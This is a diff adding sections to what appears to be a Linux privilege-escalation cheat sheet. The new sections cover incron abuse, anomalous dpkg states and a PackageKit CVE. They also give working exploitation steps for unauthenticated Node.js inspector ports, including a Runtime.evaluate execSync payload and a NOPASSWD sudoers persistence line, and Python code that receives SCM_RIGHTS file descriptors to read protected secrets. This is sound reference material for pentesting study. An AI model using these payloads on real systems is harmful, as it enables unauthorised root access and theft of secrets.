@@ -142,12 +142,14 @@
     - `8.2.1` Kernel version & exploits
     - `8.2.2` Sudo privileges
     - `8.2.3` SUID / SGID binaries
-    - `8.2.4` Cron jobs
+    - `8.2.4` Cron & incron jobs
     - `8.2.5` Exposed credentials
     - `8.2.6` SSH keys
     - `8.2.7` Writable PATH directories
     - `8.2.8` Installed software
     - `8.2.9` NFS no_root_squash privilege escalation
+    - `8.2.10` Exposed debuggers / Node.js `--inspect` ports
+    - `8.2.11` UNIX socket file-descriptor passing (SCM_RIGHTS)
   - `8.3` **Privesc Resources**
 - `9` **Useful Resources**
 
@@ -3292,12 +3294,13 @@ find / -perm -2000 -type f 2>/dev/null
 
 </details>
 
-#### 8.2.4 Cron jobs
+#### 8.2.4 Cron & incron jobs
 
 ```bash
 cat /etc/crontab
 ls -la /etc/cron.d/
 ls -la /var/spool/cron/crontabs/
+cat /etc/incron.d/*
 ```
 
 <details>
@@ -3307,6 +3310,8 @@ ls -la /var/spool/cron/crontabs/
 
 - Lists scheduled tasks. If a script referenced in a cron job is writable by your user, replace it with a malicious script to gain execution as the cron job's owner (usually root).
 - Also check for cron directories that are world-writable.
+- **incron** (`incrond`) is the inotify-based sibling of cron: instead of time triggers, it fires a command when a watched path gets a filesystem event (commonly `IN_CLOSE_WRITE`). Rules live in `/etc/incron.d/*` in `path event command` format and run as root — a prime target if your low-priv user can write to a watched file (e.g. a spool file under a service dir), because merely `touch`ing it triggers the root command.
+- Check for incron rules that point at scripts which `source` (`.`) a config file your user can write — appending a line to that config then executes as root on the next trigger.
 
 </details>
 
@@ -3389,6 +3394,14 @@ dpkg -l 2>/dev/null || rpm -qa
 **Description**
 
 - Lists installed packages. Cross-reference outdated versions with `searchsploit` to find public exploits.
+- **Flag non-standard dpkg states** (`hi` = half-configured, `rc` = removed-but-config-pending) — anomalies that often mark the intended privesc vector:
+  ```bash
+  dpkg -l | awk '$1=="hi" || $1=="rc" {print}'
+  ```
+
+**High-value package to cross-reference (`searchsploit` / NVD):**
+
+- `packagekit` — root D-Bus daemon; TOCTOU races on `InstallFiles` (CVE-2026-41651) run attacker `.deb` maintainer scripts as root.
 
 </details>
 
@@ -3447,6 +3460,92 @@ cd <mounted_share>
 **Reference:** [HackTricks — NFS No Root Squash Misconfiguration Privilege Escalation](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/linux-hardening/interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md)
 
 </details>
+
+#### 8.2.10 Exposed debuggers / Node.js `--inspect` ports
+
+**Find debug ports (run from your low-priv shell):**
+
+```bash
+ss -tlnp
+ps aux | grep -iE "node|gdb|gdbserver|--inspect|--remote-debugging|lldb"
+cat /etc/systemd/system/*.service /lib/systemd/system/*.service 2>/dev/null | grep -iE "inspect|9229|9222|remote-debugging"
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- A service running as root (or another privileged user) with `--inspect=127.0.0.1:PORT` (Node.js), `--remote-debugging-port` (Chromium), or an exposed `gdbserver` exposes an **unauthenticated debugger** on a localhost port.
+- Node's inspector serves the **Chrome DevTools Protocol (CDP)** at `http://127.0.0.1:PORT/json/list` (returns target list incl. `webSocketDebuggerUrl`) and accepts `Runtime.evaluate` frames over that websocket — a full JS REPL inside the process's user context.
+- Because it binds to `127.0.0.1`, it's invisible externally but fully reachable once you have any local shell — no port-forward needed.
+- Check `/etc/systemd/system/` service files for `--inspect` flags even when no process currently shows it (e.g. service currently down or `Restart=on-failure`).
+
+**Exploitation (Node CDP inspector):**
+
+```python
+# 1. GET http://127.0.0.1:9229/json/list  -> list of targets, grab webSocketDebuggerUrl
+# 2. Connect to ws://127.0.0.1:9229/<uuid>
+# 3. Send over the websocket:
+#    {"id":1,"method":"Runtime.evaluate","params":{"expression":"require('child_process').execSync('id').toString()","awaitPromise":true,"returnByValue":true}}
+# 4. Result = command output as root
+```
+
+- Alternative in-repo script: `wsroot.py` (CDP websocket client; connect → `json/list` → `Runtime.evaluate` with `process.mainModule.require('child_process').execSync(...)`).
+- Persist after root: `echo '<user> ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/<user>` then `chmod 440 /etc/sudoers.d/<user>`.
+
+**Parameters**
+
+- `<PORT>` — inspector port (default Node: `9229`, Chromium: `9222`).
+- `<uuid>` — per-target websocket id from `/json/list`.
+
+**Reference:** [HackTricks — Node.js inspector](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nodejs) / [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
+
+</details>
+
+#### 8.2.11 UNIX socket file-descriptor passing (SCM_RIGHTS)
+
+A privileged daemon may expose a **local UNIX socket** and, on some trigger, **pass open file descriptors (FDs) to whoever connects** via `SCM_RIGHTS` ancillary data. If a service holds a long-lived FD on a sensitive file (config with credentials, secrets), receiving that FD lets you read the file **without any filesystem permission** — `open()` already happened under the privileged account.
+
+**Discovery**
+
+```bash
+ss -xlpn                       # list UNIX sockets + owning process
+ps aux | grep -iE "daemon|sock|mgmt"   # what holds the socket
+ls -la /run /run/* /var/run    # socket path + mode (owner:group)
+```
+
+- Check socket **mode/ownership**: `srw-rw---- root:somegroup` means only root and that group can connect — if your user is in that group, the socket is yours.
+- A service that sends `STATUS:`/`ALERT:`-style replies to arbitrary connect()ions on a control socket is a strong hint it accepts management traffic from any local client.
+
+**Exploitation (receive the passed FDs and read the secret)**
+
+```python
+import socket, array, os
+
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect(SOCK_PATH)
+
+# recvmsg() returns (data, ancillary, flags, addr) — FDs ride in ancillary data
+data, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(64))
+print("msg:", data)
+
+for level, ctype, cdata in ancdata:
+    if level == socket.SOL_SOCKET and ctype == socket.SCM_RIGHTS:
+        fds = array.array("i")
+        fds.frombytes(cdata[:len(cdata) - (len(cdata) % fds.itemsize)])
+        for fd in fds:
+            # Read the file the daemon opened — permissions bypassed
+            print(f"fd {fd}:", os.read(fd, 4096))
+```
+
+**Notes**
+
+- FDs passed are copied into **your** process (new FD numbers), referencing the same open-file description as the daemon — so `read()` succeeds even if you could never `open()` the path.
+- Trigger conditions matter: some daemons only send the FDs when a state flag is set (e.g. a log file containing a keyword). Arm the trigger first, then connect.
+- The passed FD may point at a directory/log you also want — inspect each received FD.
+
+**Reference:** [man 2 recvmsg](https://man7.org/linux/man-pages/man2/recvmsg.2.html) / [SCM_RIGHTS (man 7 unix)](https://man7.org/linux/man-pages/man7/unix.7.html)
 
 ### 8.3 Privesc Resources
 
